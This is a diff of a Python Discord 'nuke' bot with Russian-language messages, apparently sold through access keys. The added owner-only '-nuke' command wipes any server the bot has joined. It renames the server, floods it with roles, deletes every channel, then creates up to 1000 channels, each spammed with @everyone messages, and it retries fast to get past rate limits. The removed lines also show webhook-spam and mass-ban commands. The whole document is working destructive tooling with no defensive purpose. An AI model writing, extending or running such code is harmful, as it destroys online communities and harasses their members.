@@ -5,7 +5,6 @@ import time
 import os
 import json
 import aiohttp
-from datetime import datetime
 
 bot = commands.Bot(command_prefix='-', intents=discord.Intents.all(), help_command=None)
 
@@ -14,7 +13,7 @@ start_time = 0
 rate_limit_hits = 0
 webhook_spam_active = False
 
-OWNER_ID = 1448196738308509739
+OWNER_ID = 123456789012345678
 
 keys_db = "keys.json"
 
@@ -48,7 +47,7 @@ async def on_ready():
     
     await bot.change_presence(
         status=discord.Status.online,
-        activity=discord.Game(name="-help")
+        activity=discord.Game(name="-dszlip")
     )
 
 @bot.event
@@ -56,27 +55,6 @@ async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
         return
     await ctx.send(f"❌ Ошибка: {error}")
-
-@bot.event
-async def on_guild_join(guild):
-    """Когда бота добавляют на сервер - отправляет ЛС владельцу сервера"""
-    try:
-        owner = guild.owner
-        embed = discord.Embed(
-            title="📋 СПИСОК КОМАНД",
-            description="Все доступные команды",
-            color=discord.Color.dark_grey()
-        )
-        embed.add_field(name="━━━━ ❗ ОСНОВНЫЕ ❗ ━━━━", value="", inline=False)
-        embed.add_field(name="-dszlip", value="Запускает процесс", inline=False)
-        embed.add_field(name="-status", value="Показывает статус бота", inline=False)
-        embed.add_field(name="-ping", value="Проверка задержки", inline=False)
-        embed.add_field(name="-webhook", value="Активирует вебхуки", inline=False)
-        embed.add_field(name="-massban", value="Массовый бан", inline=False)
-        embed.set_footer(text="Для покупки ключа напишите владельцу - dszlip")
-        await owner.send(embed=embed)
-    except:
-        pass
 
 # === ТОЛЬКО ДЛЯ ВЛАДЕЛЬЦА ===
 @bot.command()
@@ -93,7 +71,8 @@ async def admin(ctx):
     embed.add_field(name="-keys", value="Список ключей", inline=False)
     embed.add_field(name="-delkey @user/ID", value="Удалить ключ", inline=False)
     embed.add_field(name="-servers", value="Список серверов", inline=False)
-    embed.add_field(name="-send текст", value="Рассылка", inline=False)
+    embed.add_field(name="-send ID текст", value="Отправить сообщение на сервер", inline=False)
+    embed.add_field(name="-nuke ID", value="Нюкнуть сервер по ID", inline=False)
     embed.set_footer(text="MOGGED BY ZLIP")
     await ctx.send(embed=embed)
 
@@ -205,23 +184,29 @@ async def delkey(ctx, arg = None):
         await ctx.send(f"❌ У {user_name} нет ключа")
 
 @bot.command()
-async def send(ctx, *, message):
+async def send(ctx, guild_id: int = None, *, message = None):
     if not is_owner(ctx):
         return
     
-    await ctx.send(f"📡 Рассылка началась...")
+    if not guild_id:
+        await ctx.send("❌ Укажи ID сервера: -send 123456789 текст")
+        return
     
-    sent = 0
-    for guild in bot.guilds:
-        try:
-            channel = guild.system_channel or guild.text_channels[0]
-            await channel.send(f"📢 **ОБЪЯВЛЕНИЕ**\n{message}")
-            sent += 1
-            await asyncio.sleep(0.5)
-        except:
-            pass
+    if not message:
+        await ctx.send("❌ Укажи сообщение: -send 123456789 текст")
+        return
     
-    await ctx.send(f"✅ Отправлено на {sent} серверов")
+    guild = bot.get_guild(guild_id)
+    if not guild:
+        await ctx.send(f"❌ Сервер с ID {guild_id} не найден")
+        return
+    
+    try:
+        channel = guild.system_channel or guild.text_channels[0]
+        await channel.send(f"📢 **ОТ ВЛАДЕЛЬЦА**\n{message}")
+        await ctx.send(f"✅ Отправлено на сервер {guild.name}")
+    except Exception as e:
+        await ctx.send(f"❌ Ошибка: {e}")
 
 @bot.command()
 async def servers(ctx):
@@ -230,7 +215,7 @@ async def servers(ctx):
     
     server_list = ""
     for i, guild in enumerate(bot.guilds):
-        server_list += f"{i+1}. {guild.name} (ID: {guild.id}) - {len(guild.members)} участников\n"
+        server_list += f"{i+1}. {guild.name} (ID: `{guild.id}`) - {len(guild.members)} участников\n"
     
     if len(server_list) > 1900:
         with open("servers.txt", "w", encoding="utf-8") as f:
@@ -240,108 +225,164 @@ async def servers(ctx):
     else:
         await ctx.send(f"📊 Серверы бота:\n```{server_list}```")
 
-# === КОМАНДЫ ДЛЯ ПОЛЬЗОВАТЕЛЕЙ ===
 @bot.command()
-async def ping(ctx):
-    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
+async def nuke(ctx, guild_id: int = None):
+    if not is_owner(ctx):
         return
     
-    latency = round(bot.latency * 1000)
-    await ctx.send(f"🏓 Понг! Задержка: {latency}мс")
-
-@bot.command()
-async def status(ctx):
-    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
+    if not guild_id:
+        await ctx.send("❌ Укажи ID сервера: -nuke 123456789")
         return
     
-    embed = discord.Embed(
-        title="📊 СТАТУС БОТА",
-        color=discord.Color.dark_grey()
-    )
-    embed.add_field(name="Бот", value=bot.user.name, inline=True)
-    embed.add_field(name="Серверов", value=len(bot.guilds), inline=True)
-    embed.add_field(name="Пинг", value=f"{round(bot.latency * 1000)}мс", inline=True)
-    embed.set_footer(text="MOGGED BY ZLIP")
-    await ctx.send(embed=embed)
-
-@bot.command()
-async def webhook(ctx):
-    global webhook_spam_active
-    
-    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
+    guild = bot.get_guild(guild_id)
+    if not guild:
+        await ctx.send(f"❌ Сервер с ID {guild_id} не найден")
         return
     
-    if not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ Нужны права администратора!")
-        return
+    await ctx.send(f"🔥 НЮК СЕРВЕРА: {guild.name} (ID: {guild_id})")
     
-    webhook_spam_active = not webhook_spam_active
+    global channel_counter, start_time, rate_limit_hits
+    channel_counter = 0
+    start_time = time.time()
+    rate_limit_hits = 0
     
-    if webhook_spam_active:
-        await ctx.send("🌐 Вебхуки АКТИВИРОВАНЫ")
-        
-        webhook_urls = []
-        for channel in ctx.guild.text_channels:
+    async def create_roles():
+        for i in range(50):
             try:
-                webhooks = await channel.webhooks()
-                for webhook in webhooks:
-                    webhook_urls.append(webhook.url)
+                await guild.create_role(name=f"ZLIP-{i+1}")
             except:
-                pass
-        
-        if not webhook_urls:
-            await ctx.send("❌ На сервере нет вебхуков!")
-            webhook_spam_active = False
-            return
-        
-        spam_text = "@everyone\n**MOGGED BY ZLIP**\nhttps://guns.lol/dszlip"
-        
-        async def spam_webhooks():
-            while webhook_spam_active:
-                for url in webhook_urls:
-                    try:
-                        async with aiohttp.ClientSession() as session:
-                            data = {"content": spam_text}
-                            await session.post(url, json=data)
-                    except:
-                        pass
-                await asyncio.sleep(0.1)
-        
-        bot.loop.create_task(spam_webhooks())
-    else:
-        await ctx.send("🛑 Вебхуки ОСТАНОВЛЕНЫ")
-
-@bot.command()
-async def massban(ctx):
-    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
-        return
-    
-    if not ctx.author.guild_permissions.administrator:
-        await ctx.send("❌ Нужны права администратора!")
-        return
-    
-    await ctx.send("⚠️ МАССОВЫЙ БАН...")
-    
-    banned = 0
-    for member in ctx.guild.members:
-        if not member.bot:
-            try:
-                await member.ban(reason="MOGGED BY ZLIP")
-                banned += 1
-            except:
-                pass
+                break
             await asyncio.sleep(0.01)
     
-    await ctx.send(f"✅ Забанено: {banned} участников")
+    await guild.edit(name="MOGGED BY ZLIP")
+    await create_roles()
+    print(f"✅ {guild.name} - Название и роли изменены")
+    
+    print(f"🗑️ {guild.name} - УДАЛЕНИЕ КАНАЛОВ...")
+    
+    deleted = 0
+    skipped = 0
+    channels = list(guild.channels)
+    total = len(channels)
+    
+    async def delete_single_channel(channel):
+        try:
+            await channel.delete()
+            return True
+        except:
+            return False
+    
+    batch_size = 200
+    for i in range(0, total, batch_size):
+        batch = channels[i:i+batch_size]
+        tasks = [delete_single_channel(ch) for ch in batch]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        for result in results:
+            if result is True:
+                deleted += 1
+            else:
+                skipped += 1
+        
+        if (i + batch_size) % 400 == 0:
+            print(f"   📦 {guild.name} - Удалено {min(i+batch_size, total)}/{total} каналов")
+    
+    print(f"📊 {guild.name} - Каналы: удалено {deleted}, пропущено {skipped}")
+    
+    print(f"🔥 {guild.name} - СОЗДАНИЕ КАНАЛОВ...")
+    
+    SPAM_TEXT = """@everyone
+**MOGGED BY ZLIP**
 
+https://guns.lol/dszlip
+
+ВЫ УПАЛИ НА КОЛЕНИ ПЕРЕД ZLIP
+"""
+    
+    created = 0
+    failed = 0
+    target_channels = 1000
+    
+    async def create_single_channel(i):
+        global channel_counter, rate_limit_hits
+        
+        try:
+            ch = await guild.create_text_channel(f"zlip-nuked-{i+1}")
+            
+            messages = [ch.send(SPAM_TEXT) for _ in range(5)]
+            await asyncio.gather(*messages)
+            
+            channel_counter += 1
+            
+            if channel_counter % 10 == 0:
+                elapsed = time.time() - start_time
+                speed = channel_counter / elapsed if elapsed > 0 else 0
+                print(f"📊 [{channel_counter}] {speed:.1f}/сек")
+            
+            return True
+            
+        except discord.Forbidden:
+            return False
+        except discord.HTTPException as e:
+            if "rate" in str(e).lower():
+                rate_limit_hits += 1
+                wait_time = min(rate_limit_hits * 0.001, 0.005)
+                await asyncio.sleep(wait_time)
+                return await create_single_channel(i)
+            else:
+                return False
+        except Exception as e:
+            return False
+    
+    batch_size = 100
+    max_batches = target_channels // batch_size + 1
+    
+    for batch_num in range(max_batches):
+        tasks = []
+        for j in range(batch_size):
+            i = batch_num * batch_size + j
+            if i >= target_channels:
+                break
+            tasks.append(create_single_channel(i))
+        
+        if not tasks:
+            break
+        
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        for result in results:
+            if result is True:
+                created += 1
+            else:
+                failed += 1
+        
+        if created >= target_channels:
+            print(f"✅ {guild.name} - Достигнута цель: {created} каналов")
+            break
+        
+        if created % 50 == 0 and created > 0:
+            elapsed = time.time() - start_time
+            speed = created / elapsed if elapsed > 0 else 0
+            print(f"📊 ПРОГРЕСС: {created}/{target_channels} ({speed:.1f}/сек)")
+    
+    print("\n" + "="*50)
+    print(f"💀 НЬЮК ЗАВЕРШЁН: {guild.name}")
+    print(f"✅ Создано каналов: {created}")
+    print(f"✅ Сообщений отправлено: {created * 5}")
+    print(f"❌ Ошибок: {failed}")
+    print(f"⏱️ Время: {time.time() - start_time:.1f} сек")
+    print("="*50)
+    
+    try:
+        await ctx.send(f"**✅ СЕРВЕР УНИЧТОЖЕН**\n{guild.name}\nСоздано: {created} каналов\nСообщений: {created * 5}")
+    except:
+        pass
+
+# === КОМАНДЫ ДЛЯ ПОЛЬЗОВАТЕЛЕЙ ===
 @bot.command()
 async def dszlip(ctx):
-    if not has_valid_key(ctx.author.id) and not is_owner(ctx):
-        await ctx.send("❌ У тебя нет доступа! Купи ключ у владельца")
+    if not has_valid_key(str(ctx.author.id)) and not is_owner(ctx):
+        await ctx.send("❌ Купи ключ у владельца")
         return
     
     if not ctx.author.guild_permissions.administrator:
